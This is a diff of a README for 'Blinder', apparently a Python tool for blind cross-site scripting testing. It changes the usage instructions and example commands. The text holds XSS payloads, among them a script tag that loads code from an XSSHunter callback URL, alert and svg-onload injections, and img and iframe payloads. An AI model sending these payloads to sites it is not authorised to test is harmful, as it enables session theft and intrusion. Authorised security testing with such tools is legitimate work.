@@ -15,37 +15,36 @@ python3 Blinder.py [ARGS]
 
 # How To Use:
 ## Basic:
-- You Can Run Blinder In a Basic Usage By Just Using This Command. Where `-u` Options Is Your XSSHunter Username And `-f` Is The File That Contains The URLs With NewLine Seprator
+- That's blinder basic usage example, you just specify XSShunter username using `-u` argument and the URLs file using `-f` argument
 ```
-python3 Blinder.py -u hacker -f URLs
+python3 Blinder.py -u xsshunter -f urls-file.txt
 ```
 
 ## Redirections
-- To Disallow/Allow Redirections You Can Use `-r` Options With The Rule You Want. Disallowing Redirections Will Make The Tool Faster But It Might Miss Some Results. By Default Redirections Is Allowed On Blinder
+- To disalow/allow redirects on blinder, all you need to-do is use `-r` option with either `deny` or `allow` strings
 
-- The Redirection Rules Are `allow` and `deny` In LowerCase. The Program Will Trigger An Error In Case You Used Something Else.
 ```
-python3 Blinder.py -u hacker -f URLs -r deny
+python3 Blinder.py -u xsshunter -f urls-file.txt -r deny
 ```
 ## Payloads and multi payloads.
 - In blinder, the default payload we use is `"><script src={xsshunter-url}></script>`, But you can always use your own payload using `-p` argument.
 ```
-python3 Blinder.py -u hacker -f URLs -p '"><img src="XXX">'
+python3 Blinder.py -u hacker -f urls-file.txt -p '"><img src="XXX">'
 ```
 
 - If you wanna use more than one payload, you can seperate them using `,` character for example: `"><script>alert(1)</script>,"><svg/onload=alert(1)>`, if your payload requires `,` character and you can't seperate them using that character you can use `-s` option to use another character to-do that
 
 ```
-python3 Blinder.py -u xsshunter -f URLs -p '<img src="XXX">,<iframe src="XXX">'
+python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="XXX">,<iframe src="XXX">'
 ```
 ```
-python3 Blinder.py -u xsshunter -f URLs -p '<img src="XXX">_<iframe src="XXX">' -s '_'
+python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="XXX">_<iframe src="XXX">' -s '_'
 ```
 
 - By default, Blinder uses `XXX` as string to replace with the XSShunter/requestbin URL, incase that can't be used with your payload and your payload contains `XSS` inside of it, you can always use `--replace` argument to use another string to replace it with 
 
 ```
-python3 Blinder.py -u xsshunter -f URLs -p '<img src="RRR">_<iframe src="RRR">' -s '_' --replace 'RRR'
+python3 Blinder.py -u xsshunter -f urls-file.txt -p '<img src="RRR">_<iframe src="RRR">' -s '_' --replace 'RRR'
 ```
 
 ## Headers
